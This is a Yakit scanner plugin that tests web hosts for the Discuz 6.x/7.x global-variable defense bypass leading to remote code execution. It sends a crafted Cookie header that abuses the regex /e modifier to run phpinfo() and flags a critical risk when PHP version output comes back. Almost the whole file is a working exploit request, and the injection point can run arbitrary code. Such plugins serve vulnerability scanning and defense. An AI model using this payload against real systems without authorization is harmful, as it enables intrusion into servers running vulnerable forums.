# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)


    packet1 = `GET /viewthread.php?tid=1 HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();

`


    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(10),
    )
    rspIns, _ = poc.ParseBytesToHTTPResponse(rsp)
    reqIns, _ = poc.ParseBytesToHTTPRequest(req)
    if str.MatchAllOfSubString(rsp, `PHP Version`,`PHP API `) {
            yakit.Info(
                "%v found Discuz 7.x/6.x 全局变量防御绕过导致代码执行漏洞", 
                addr, 
            )
            risk.NewRisk(
                addr,
                risk.title("Discuz 7.x/6.x 全局变量防御绕过导致代码执行漏洞"),
                risk.severity("critical"),
                risk.titleVerbose("Discuz 7.x/6.x 全局变量防御绕过导致代码执行漏洞"),
                risk.request(string(rspIns)),
                risk.response(string(reqIns)),
                risk.cve("NO CVE"),
            )
        }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
